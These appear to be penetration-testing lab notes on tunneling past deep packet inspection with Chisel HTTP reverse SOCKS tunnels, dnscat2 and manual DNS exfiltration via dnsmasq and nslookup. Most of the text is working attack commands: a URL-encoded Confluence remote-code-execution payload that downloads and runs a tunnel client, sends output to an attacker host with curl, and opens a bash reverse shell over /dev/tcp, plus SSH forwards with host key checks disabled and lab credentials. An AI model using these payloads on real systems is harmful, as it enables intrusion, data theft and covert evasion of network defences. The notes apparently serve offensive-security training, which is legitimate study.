# Tunneling through deep packet inspection firewalls

* HTTP Tunneling Theory and Practice
* DNS Tunneling Theory and Practice

## HTTP Reverse Port Forwarding with Chisel

Scenario

* Attacker can execute commands on Victim shell
* Attacker can establish outgoing HTTP connections only
* Download <https://github.com/jpillora/chisel/releases>
* Use Chisel to establish a HTTP Reverse Port Forwarding Tunnel
* Use Chisel server bind a SOCKS proxy port on the Kali machine
* Serve Chisel client for the correct platform
* Download and start a Chisel client on Victim
* Use the Reverse Tunnel from Victim to Attacker
* Use **SSH with ncat Socks5 proxy to connect through the Tunnel** to a Remote Host behind the Victim

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel precompiled releases are available for the platforms MacOS, Linux and Windows. Ensure to download the correct version for your maschine.

Among Ncat’s vast number of features there is the ability to chain Ncats together, redirect both TCP and UDP ports to other sites, SSL support, and proxy connections via SOCKS4 or HTTP (CONNECT method) proxies (with optional proxy authentication as well). This enable most application network capabilities.

Attack

* Serve Chisel client using Appache HTTP
* Verify that Chisel client has been downloaded  
* Run Chisel server with reverse tunneling options
* --reverse Allow clients to specify reverse port forwarding
* Run SSH with ProxyCommand using ncat to proxy socks 5 via SSH

```bash
# Download and unzip Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz -O /tmp/chisel_1.8.1_linux_amd64.gz
gunzip /tmp/chisel_1.8.1_linux_amd64.gz

# Serve Chisel client using Apache HTTP 
sudo cp /tmp/chisel /var/www/html/
sudo systemctl start apache2

# Verify that Chisel client has been downloaded  
tail -f /var/log/apache2/access.log
  "GET /chisel HTTP/1.1" 200 8593795 "-" "Wget/1.20.3 (linux-gnu)"

# Run Chisel server with reverse tunneling options
chisel server --port 8080 --reverse
  server: Reverse tunnelling enabled
  server: Listening on http://0.0.0.0:8080

# Verify that capture incoming traffic using TCPdump
sudo tcpdump -nvvvXi tun0 tcp port 8080

# Finally, establish a forward SSH with ncat that supports socks5 proxying
# Use Option ProxyCommand <https://man.openbsd.org/ssh_config#ProxyCommand
# The command tells Ncat to use the socks5 and the proxy socket at 127.0.0.1:1080. 
# The %h and %p tokens represent the SSH command host and port values.
sudo apt install ncat
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215

```

Victim

* Download and run Chisel client
* Run Chisel client from web shell
* R:socks Reverse Tunnel via socks on default port 1080
* curl --data @/tmp/output http://192.168.118.4:8080/

```bash
# Download Chisel client
wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Put together into curl for exploiting Confluence RCE
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/




# Run Chisel client from web shell and report back error to the Attacker on port 8080
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/ 
# Run Chisel client from web shell in background
/tmp/chisel client 192.168.118.4:8080 R:socks &> /dev/null 2&1 &


# Put together into curl for exploiting Confluence RCE
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/

```

## DNS Tunneling using dsncat2

Scenario

* **Limitation**: Require that Attacker has shell access to authoritive DNS
* **Limitation**: DNS Tunneling with dnscat is not stealthy, use it carefully
* Attacker has shell access to Victim
* Install `sudo apt install dnscat2` on a controlled authoritive DNS
* Download dnscat2 from <https://downloads.skullsecurity.org/dnscat2/> or compile from GitHub <https://github.com/iagox86/dnscat2>
* Start dnscat2-server on authoritive DNS server for the domain
* Start dnscat2-client from Victim to infiltrate/exfiltrate data to/from Victim
* Establish a SSH like -L tunnel using listen command
* Attack server behind the tunnel from Kali

We can use dnscat2 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records. A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines

Attack

* Inspect incoming DNS traffic from an Attacker controlled authoritive DNS
* Start dnscat2-server waiting for incoming client connections from the Victim

```bash
# Inspect incoming DNS traffic
sudo tcpdump -i ens192 udp port 53

# Start dnscat2 Server
dnscat2-server feline.corp

Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = feline.corp]

# Show sessions windows and interact with one
dnscat2> windows
dnscat2> window -i 1

# Establish a SSH local like forword
# listen on loopback 127.0.0.1
# listen on all interfaces 0.0.0.0
dnscat2> listen --help
dnscat2> listen 0.0.0.0:4455 <ANOTER-VICTIM>:445
```

Victim

```bash
./dnscat feline.corp

Session established!
```

Attack

```bash
user@kali$ smbclient -p 4455 -L //<DNS-SERVER> -U hr_admin --password=Welcome1234
```

## Manual DNS Tunneling using dnsmasq and nslookup

* Deep Packet Inspection does not allow in/out traffic from internal network
* Attacker has shell access to Victim
* Attacker has shell access to authoritive DNS
* Use dnsmasq -d to setup a DNS
* Use nslookup to exfiltrate or infiltrate data

Attack

```bash

# exfiltration using DNS A-record
sudo dnsmasq -C dnsmasq_txt.conf -d
sudo tcpdump -i ens192 udp port 53

04:57:40.721682 IP 192.168.50.64.65122 > 192.168.118.4.domain: 26234+ [1au] A? exfiltrated-data.feline.corp. (57)

# infiltration using DNS TXT-records
cat dnsmasq_txt.conf

  # Do NOT read /etc/resolve.conf or /etc/hosts
  no-resolv
  no-hosts

  # Define the ZONE
  auth-zone=feline.corp
  auth-server=feline.corp

  # TXT record
  txt-record=www.feline.corp,here's is data chunk to be sent to network!
  txt-record=www.feline.corp,here's another data junk.

sudo dnsmasq -C dnsmasq_txt.conf -d
```

Victim

```bash
# get configured DNS
resolvectl status

  DNS Servers: ...

# exfiltrate small data chunks after flushhing DNS cache
resolvectl flush-caches
nslookup exfiltrated-data.ATTACKER.domain [DNS-IP]

# infiltrate small data chunks
nslookup -type=txt www.feline.corp [DNS-IP]

www.feline.corp text = "here's is data chunk to be sent to network!"
www.feline.corp text = "here's another data junk"
```

---

exercise

192.168.195.64

Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - MULTISERVER03 OS Credentials:

No credentials were provided for this machine

192.168.195.7

Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - FELINEAUTHORITY OS Credentials:

kali / 7he_C4t_c0ntro11er

10.4.195.215

Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - PGDATABASE01 OS Credentials:

database_admin / sqlpass123

172.16.195.217

Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - HRSHARES OS Credentials:

No credentials were provided for this machine

192.168.195.63

Tunneling Through Deep Packet Inspection - DNS Tunneling with dnscat2 - CONFLUENCE01 OS Credentials:

No credentials were provided for this machine

Exploit

```bash
curl http://192.168.163.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.164/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

Victim

```bash
# SSH Remote Port Forward tunnel from KALI to PGDATABASE
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -R 127.0.0.1:2222:10.4.163.215:22 bmoser@192.168.45.164 -v -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

```

Attack

```bash
# SSH into FELINEAUTHRITY
ssh -p 22 kali@192.168.163.7 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" 

# Run dnscat2 server
dnscat2-server feline.corp
...
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53

dnscat2>

# Spawn Reverse Shell
curl http://192.168.195.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.170/4444%200%3E%261%27%29.start%28%29%22%29%7D/

# SSH into PGDATABASE
sudo systemctl start ssh

ssh -p 2222 database_admin@127.0.0.1 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"

# Get TXT record
resolvectl status
nslookup -type=txt www.feline.corp 192.168.195.64
...
give-me.cat-facts.internal      text =

# Run dnscat2 client
./dnscat feline.corp

# Connect to the newly created session window 1
dnscat2> New window created: 1
dnscat2> window -i 1

# Establish a SSH local like forword
dnscat2> listen 0.0.0.0:4455 172.16.195.217:445
Listening on 0.0.0.0:4455, sending connections to 172.16.195.217:445

# Run SMB attack from Kali
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```
